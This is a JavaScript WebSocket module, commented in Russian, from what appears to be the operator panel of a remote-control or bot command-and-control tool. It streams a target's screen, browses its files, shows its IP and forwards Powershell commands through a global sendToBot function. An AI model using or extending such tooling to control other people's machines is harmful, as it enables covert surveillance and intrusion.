// frontend\client_control\js\modules\websocket\connection.js

// frontend\client_control\js\modules\websocket\connection.js

import { AppState } from '../core/states.js';
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
import { renderScreenRGBA } from '../features/screen_renderer.js';

let socket = null;
const $ = id => document.getElementById(id);

const ui = (id, val) => { if ($(id)) $(id).textContent = val ?? '...'; };

/**
 * Обработка входящих пакетов
 */
const handleIncomingData = (buf) => {
    const pkg = decodePacket(buf);
    
    if (!pkg) return; // Молча выходим, если пакет битый

    const { module, type, action, payload } = pkg;

    switch (module) {
        case 'ScreenView':
            if (action === 'STOP') return window.resetRenderer?.();
            // Рендерим только бинарные данные видеопотока
            if (type === 'bin' && action === 'DATA') return renderScreenRGBA(payload);
            break;

        case 'SystemInfo':
            if (payload?.ip) ui('display-ip', payload.ip);
            if (payload?.id) ui('display-id', payload.id);
            if (payload?.status) window.updateBotStatus?.(payload.status);
            break;

        case 'FileManager':
            if (action === 'LIST' && window.renderFileSystem) {
                window.renderFileSystem(payload, pkg);
            } else {
                // DT_START, DT_DATA и прочие события файлового менеджера
                window.dispatchEvent(new CustomEvent(`${module}:${action}`, { detail: pkg }));
            }
            break;

        default:
            // Универсальная пересылка для остальных модулей (Powershell, RemoteControl и т.д.)
            window.dispatchEvent(new CustomEvent(`${module}:${action}`, { detail: pkg }));
    }
};

/**
 * Инициализация WebSocket
 */
export const initControlConnection = () => {
    const { clientId: tid } = AppState;
    const [token, login] = ['auth_token', 'user_login'].map(k => localStorage.getItem(k));
    
    if (!token || !tid) return;

    const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const url = `${protocol}//${location.host}/ws?token=${token}&login=${login}&mode=control&target=${encodeURIComponent(tid)}`;
    
    socket = new WebSocket(url);
    socket.binaryType = 'arraybuffer';
    
    socket.onopen = () => window.updateBotStatus?.('online');
    socket.onclose = () => window.updateBotStatus?.('offline');
    socket.onmessage = (e) => handleIncomingData(e.data);

    /**
     * Глобальная функция отправки команд боту
     */
    window.sendToBot = (modName, pay, action = 'DATA', extra = 'none') => {
        if (!socket || socket.readyState !== 1) return;

        let type = 'str';
        if (pay instanceof ArrayBuffer || pay instanceof Uint8Array) {
            type = 'bin';
        } else if (typeof pay === 'object' && pay !== null) {
            type = 'json';
        }
        
        // Специфическая обработка для навигации
        if (action === 'LIST') {
            type = 'json';
            pay = pay || {}; 
        }

        const encoded = encodePacket(tid, modName, type, action, extra, pay);
        socket.send(encoded);
    };
};